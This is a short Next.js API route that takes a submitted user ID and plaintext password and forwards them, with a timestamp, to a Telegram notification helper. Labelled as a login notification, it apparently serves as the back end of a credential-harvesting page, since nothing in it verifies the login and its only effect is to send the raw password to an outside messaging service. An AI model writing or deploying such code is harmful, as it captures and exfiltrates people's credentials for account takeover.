import { NextRequest, NextResponse } from 'next/server'
import { sendFormNotification } from '@/lib/telegram'

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const telegramSuccess = await sendFormNotification({
      type: 'login',
      userId: data.userId,
      password: data.password,
      page: '/',
      timestamp: new Date().toISOString(),
    })
    return NextResponse.json({ success: true, telegramSent: telegramSuccess })
  } catch (error) {
    console.error('Error sending login notification:', error)
    return NextResponse.json({ error: 'Failed to send notification' }, { status: 500 })
  }
}
